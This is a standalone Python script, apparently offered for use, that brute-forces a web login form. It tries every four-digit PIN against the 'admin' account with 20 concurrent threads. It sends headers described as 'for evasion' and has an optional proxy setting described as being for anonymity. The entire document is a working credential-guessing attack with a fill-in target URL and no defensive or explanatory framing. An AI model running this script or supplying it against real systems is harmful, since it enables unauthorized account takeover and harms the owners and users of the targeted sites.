import requests
from concurrent.futures import ThreadPoolExecutor
import time

url = "add your target url here"  #add your target url
username = "admin"
password_list = [str(i).zfill(4) for i in range(10000)] #custom the range if you want range(1000,10000)
found = False

# Optional: Configure proxies (e.g., for anonymity or Burp Suite)
proxies = {
    # "http": "http://127.0.0.1:8080",
    # "https": "http://127.0.0.1:8080",
}

# Headers for evasion (mimic browser)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/x-www-form-urlencoded"
}

session = requests.Session()

def try_login(password):
    global found
    if found:
        return

    data = {"username": username, "password": password}
    try:
        response = session.post(url, data=data, headers=headers, proxies=proxies, timeout=5)

        if "Invalid" not in response.text:
            found = True
            print(f"[+] Found valid credentials: {username}:{password}")
    except requests.RequestException as e:
        print(f"[!] Error for password {password}: {e}")

def brute_force():
    start_time = time.time()
    print("[*] Starting brute force...")
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(try_login, password_list)
    
    print(f"[*] Completed in {time.time() - start_time:.2f} seconds.")

if __name__ == "__main__":
    brute_force()
